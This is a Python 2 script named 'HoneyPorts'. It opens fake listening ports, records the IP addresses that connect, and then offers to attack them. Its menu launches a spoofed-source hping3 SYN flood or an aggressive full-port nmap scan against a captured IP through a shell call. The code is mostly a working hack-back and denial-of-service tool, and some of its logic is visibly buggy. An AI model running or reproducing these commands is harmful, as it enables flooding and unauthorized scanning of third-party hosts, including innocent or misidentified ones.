'''
    Fake ports
'''
import subprocess
import socket
import sys
import os
import ipaddress
from colorama import init, Style
from termcolor import colored
init()

os.system('clear')
print"\n\n"
print(Style.BRIGHT + colored("___   ___   ______  ___   ___ _______ __    __  ______    ______   _____   _________  _______",'green'))
print(Style.BRIGHT + colored("| |   | |  /  __  \ |  \  | | |  ___| \ \  / /  |  __ \  /  __  \  |  _  \ |__   __|  | ____|",'green'))
print(Style.BRIGHT + colored("| |___| |  | |  | | |   \ | | | |____  \ \/ /   | |_| |  | |  | |  | |_| |    | |     | |___",'green'))
print(Style.BRIGHT + colored("|  ___  |  | |  | | | |\ \| | |  ___|   \  /    | ____/  | |  | |  |     /    | |     |____ |",'green'))
print(Style.BRIGHT + colored("| |   | |  | |__| | | | \   | | |____   | |     | |      | |__| |  | |\ \     | |     ____| |",'green'))
print(Style.BRIGHT + colored("|_|   |_|  \______/ |_|  \__| |_____|   |_|     |_|      \______/  |_| \_\    |_|     |_____| v.0.1.1",'green'))
print"\n\n"
print(Style.BRIGHT + colored("|| Created by Harshad Sathaye",'blue'))
print(Style.BRIGHT + colored("|| Emulates open ports and running services.",'blue'))
print(Style.BRIGHT + colored("|| Contact for suggestions :- email :- thehoneyports@yahoo.com ",'blue'))
print"\n"

try:
	HOST = ''   # Symbolic name, meaning all available interfaces
	 # Arbitrary non-privileged port
	sock = []
	no_port = int(input("How many fake ports you want to open ? :- "))
	PORT = []
	for i in range(no_port):
          temp_sock = 's' + str(i)
          temp_port = int(input("Enter port for socket "))
          sock.append(temp_sock)
          PORT.append(temp_port)
	for i in range(no_port):
		sock[i] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print 'Fake ports opened successfully'
	 
	#Bind socket to local host and port
	try:
		for i in range(no_port):
			sock[i].bind((HOST,PORT[i]))
	except socket.error as msg:
		if no_port < 1024:
			print 'Sorry ! You tried to use a privilaged port. Try using sudo.'
		print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()
	     
	 
	#Start listening on socket
	for i in range(no_port):
		sock[i].listen(10)
	print 'Fake Ports are waiting for victim...'
	 
	#now keep talking with the client
	addr = []
	while 1:
	    #wait to accept a connection - blocking call
		try:
			for i in range(no_port):
				conn, temp_addr = sock[i].accept()
				addr.append(temp_addr)
				print 'Port Scan attempted by :- ' + addr[i][0] + ':' + str(addr[i][1])
	    	  #print addr[0]
		except KeyboardInterrupt as msg:
			print '\nCaptured IPs are :- '
			j = 0
			while j <len(addr):
				temp = 1;
				if 'addr[i]' != 'addr[i-1]':
					print "(%d)." %temp, addr[j]
				temp = temp +1
				j+= 1
			while 1:			
				print '\nIPs Captured... Select any attack'
				print '\n(1).DoS.\n(2).Port Scan.\n(3).Do nothing, Hurt me plenty ! :(\n'
				choice = raw_input('Enter your choice :- ')
				if choice == '1':
					target = raw_input("Enter target from captured IPs :- ")
					host = ipaddress.IPv4Address(target)
					try:
						subprocess.call("hping3 -S --flood --rand-source -c 18744450000 -d 400 %s"% str(host), shell=True)
					except KeyboardInterrupt as msg:
						print 'Flooding Stopped. Quiting program.'
				elif choice == '2':
					target = raw_input("Enter target from captured IPs :- ")
					host = ipaddress.IPv4Address(target)
					subprocess.call("nmap -p 1-65535 -T4 -A -v -sV -O %s"% str(host),shell=True)
				elif choice == '3':
					print 'God be with you'
					exit()
				
				
	for i in range(no_port):
		sock[i].close()
except KeyboardInterrupt as msg:
	print '\nKeyboard interrupt detected.\nNo action taken. Closing program.... '
